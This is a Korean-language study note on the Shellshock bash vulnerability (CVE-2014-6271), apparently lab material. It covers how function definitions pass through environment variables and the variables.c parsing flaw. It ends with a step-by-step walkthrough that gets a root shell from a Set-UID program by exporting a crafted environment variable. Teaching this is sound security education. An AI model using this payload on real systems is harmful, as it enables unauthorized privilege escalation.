## Shellshock 완전 정리

---

### 1. 배경: Shell Function 기초

Shell에서 함수를 정의하고 사용하는 방법입니다.

bash

```bash
$ foo() { echo "Inside function"; }  # 함수 정의
$ declare -f foo                      # 함수 확인
foo ()
{
    echo "Inside function"
}
$ foo                                 # 함수 실행
Inside function
$ unset -f foo                        # 함수 삭제
```

---

### 2. Shell Function을 자식 프로세스에 전달하는 방법

#### Approach 1: `export -f` 사용 (정석)

bash

```bash
$ foo() { echo "hello world"; }
$ export -f foo          # 함수를 export
$ bash                   # 자식 bash 실행
(child):$ declare -f foo # 자식에서도 함수 존재 확인
(child):$ foo
hello world
```

#### Approach 2: 환경변수로 전달 (Shellshock의 핵심 원리)

bash

```bash
$ foo='() { echo "hello world"; }'  # 그냥 문자열 변수! (함수 아님)
$ export foo                         # 환경변수로 export
$ bash_shellshock                    # 취약한 bash 실행
(child):$ declare -f foo             # 자식에서 함수로 변환됨!
foo ()
{
    echo "hello world"
}
```

**핵심 포인트:**

```
부모가 foo라는 환경변수(문자열)를 넘김
        ↓
자식 bash가 시작할 때 환경변수를 스캔
        ↓
"() {" 로 시작하는 변수 발견
        ↓
bash가 이를 함수 정의로 변환!
```

두 방식 모두 내부적으로 **환경변수를 사용**하는 동일한 메커니즘입니다.

---

### 3. Shellshock 취약점이란?

**CVE-2014-6271**, 2014년 9월 24일 공개, 1989년부터 존재한 버그입니다.

#### 핵심 버그

bash가 환경변수를 함수로 변환할 때 **함수 정의 뒤에 오는 명령어까지 실행**해버립니다.

bash

```bash
$ foo='() { echo "hello world"; }; echo "extra";'
#                                 ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
#                              이 추가 명령어가 문제!

$ export foo
$ bash_shellshock          # 취약한 bash 실행
extra                      # ← 함수 정의만 해야 하는데 extra가 실행됨!
```

---

### 4. Bash 소스코드의 실수

`variables.c` 파일의 `initialize_shell_variables()` 함수에서 발생합니다.

```
환경변수 스캔 중...
        ↓
① "() {" 로 시작하는 변수 발견
   → "=" 를 공백으로 교체

Line A:  foo=() { echo "hello world"; }; echo "extra";
                ↓  (= 를 공백으로 교체)
Line B:  foo () { echo "hello world"; }; echo "extra";

        ↓
② parse_and_execute() 호출 (Line B 전체를 파싱)
```

**문제:** `parse_and_execute()`는 함수 정의만 파싱해야 하는데, **함수 뒤의 명령어도 실행**합니다.

```
Line B:  foo () { echo "hello world"; }; echo "extra";
         ←────────────────────────────→  ←──────────→
               함수 정의 (파싱만)          추가 명령어 (실행됨!)
```

---

### 5. Shellshock 공격 조건

공격이 성립하려면 **2가지 조건**이 필요합니다.

```
① 타겟 프로세스가 bash를 실행해야 함
② 공격자가 환경변수를 통해 입력을 전달할 수 있어야 함
```

---

### 6. Shellshock Attack on Set-UID Programs

#### 취약한 프로그램 (vul.c)

c

```c
void main() {
    setuid(geteuid());
    system("/bin/ls -l");   // system() → /bin/sh 실행 → ls 실행
}
```

실행 흐름:

```
./vul (Set-UID root)
    → system("/bin/ls -l")
        → fork()로 자식 프로세스 생성
            → execl()로 /bin/sh 실행  ← 환경변수가 전달됨!
                → /bin/sh가 ls 실행
```

#### 공격 실행

bash

```bash
# 1. vul을 Set-UID root로 만들기
gcc vul.c -o vul
sudo chown root vul
sudo chmod 4755 vul

# 2. 정상 실행 확인
$ ./vul
-rwxrwxr-x 1 seed seed 7236 ... vul   # ls 결과 정상 출력

# 3. /bin/sh를 취약한 bash로 교체
sudo ln -sf /bin/bash_shellshock /bin/sh

# 4. 악성 환경변수 설정
$ export foo='() { echo "hello"; }; /bin/sh'
#                                   ↑↑↑↑↑↑↑
#                              추가 명령어: root shell 실행!

# 5. vul 실행
$ ./vul
sh-4.2#        ← root shell 획득!
```

#### 왜 성공하나?

```
./vul 실행 (root 권한)
    → system()이 /bin/sh 실행
        → /bin/sh = bash_shellshock (취약한 버전)
            → 환경변수 foo 스캔
                → "() {" 발견 → 함수로 변환 시도
                    → }; 뒤의 /bin/sh 도 실행됨!
                        → root 권한의 shell 획득!
```

   → 악성명령어가 root 권한으로 실행됨!
